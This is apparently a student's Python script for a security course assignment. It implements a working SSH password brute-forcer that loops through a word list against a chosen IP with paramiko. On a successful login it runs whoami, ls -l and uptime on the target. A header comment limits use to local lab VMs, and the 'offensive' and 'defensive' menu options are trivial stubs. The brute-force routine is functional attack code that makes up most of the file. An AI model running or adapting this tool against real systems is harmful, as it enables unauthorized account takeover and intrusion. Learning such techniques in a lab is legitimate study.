#!/usr/bin/env python3

# Script Name:                  Challenge 401 Class 17
# Author Name:                  Nathalie Abdallah
# Date of latest revision:      01/30/2024
# Sources:                      https://chat.openai.com/, https://www.youtube.com/watch?v=vk4WWIreH8Q, https://thepythoncode.com/article/encrypt-decrypt-files-symmetric-python, https://pypi.org/project/cryptography/
# Purpose:                      Add to your Python brute force tool the capability to:

# Authenticate to an SSH server by its IP address.
# Assume the username and IP are known inputs and attempt each word on the provided word list until successful login takes place.
# Note: Stay out of trouble! Restrict this kind of traffic to your local network VMs.

import time
import paramiko

def ssh_connect(host, port, user, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port, user, password)
        return ssh, True
    except paramiko.AuthenticationException:
        return None, False

def offensive_mode(filepath):
    print("Offensive mode selected. This option is not implemented in this example.")

def defensive_mode(word, filepath):
    with open(filepath, 'r') as file:
        words = file.read().splitlines()
        if word in words:
            print("Word found in list.")
        else:
            print("Word not found.")

def ssh_login_test(host, user, filepath):
    with open(filepath, 'r') as file:
        for line in file:
            password = line.strip()
            print(f"Trying password: {password}")
            ssh, success = ssh_connect(host, 22, user, password)
            if success:
                print("____________________________________________")
                print(f"Success! Password is: {password}")
                print("____________________________________________")

                # Execute and display the output of 'whoami'
                stdin, stdout, stderr = ssh.exec_command("whoami")
                print("____________________________________________")
                print("User:", stdout.read().decode().strip())
                print("____________________________________________")

                # Execute and display the output of 'ls -l'
                stdin, stdout, stderr = ssh.exec_command("ls -l")
                print("____________________________________________")
                print("Directory Listing:\n", stdout.read().decode().strip())
                print("____________________________________________")

                # Execute and display the output of 'uptime'
                stdin, stdout, stderr = ssh.exec_command("uptime")
                print("____________________________________________")
                print("System Uptime:", stdout.read().decode().strip())
                print("____________________________________________")

                ssh.close()
                break
            time.sleep(1)

def main():
    choose = "Choose an option"
    print(f"{choose:^60}")
    print("Option 1: Offensive; Dictionary Iterator")
    print("Option 2: Defensive; Password Recognized")
    print("Option 3: SSH Login Test")

    option = input("Your choice: ")

    if option == "1":
        filepath = input("Enter file path for the dictionary: ")
        offensive_mode(filepath)
    elif option == "2":
        usrinput = input("Enter word: ")
        filepath = input("Enter file path for word list: ")
        defensive_mode(usrinput, filepath)
    elif option == "3":
        host = input("IP: ")
        user = input("Username: ")
        filepath = input("Enter file path for password list: ")
        ssh_login_test(host, user, filepath)
    else:
        print("Invalid option, please choose 1, 2, or 3.")

if __name__ == "__main__":
    main()

